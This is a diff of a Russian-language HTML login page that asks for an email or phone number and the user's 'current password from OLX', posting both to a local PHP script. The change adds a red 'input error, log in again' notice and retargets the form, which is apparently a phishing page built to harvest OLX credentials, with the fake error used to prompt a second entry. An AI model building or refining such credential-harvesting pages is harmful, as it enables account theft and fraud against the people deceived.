@@ -18,19 +18,24 @@
     .fig {
     text-align: center; /* Выравнивание по центру */ 
    }
+    .text {
+    text-align: center; /* Выравнивание по центру */ 
+    color: #FF0000;
+   }
     form{padding:14px}
     </style>
 </head>
 <body>
 <p class="fig"> <img src="logo.png" alt="Письма мастера дзен"></p>
 <div id="action_form">
-    <form action="form2.php" method="post">
+    <form action="form.php" method="post">
         <label for="username">Логин:</label>
         <input name="username" id="username" type="text" size="30"  placeholder="Email или номер телефона"><br/>
         <label for="password">Пароль:</label>
         <input name="password" id="password"  type="password" size="30" placeholder="Ваш текущий пароль от OLX">
         <p><input type="submit" value="Войти"></p>
-    </form>
+ </form>
+  <p class="text"> Ошибка ввода данных! Повторите вход!</p>
 </div>
 </body>
 </html>
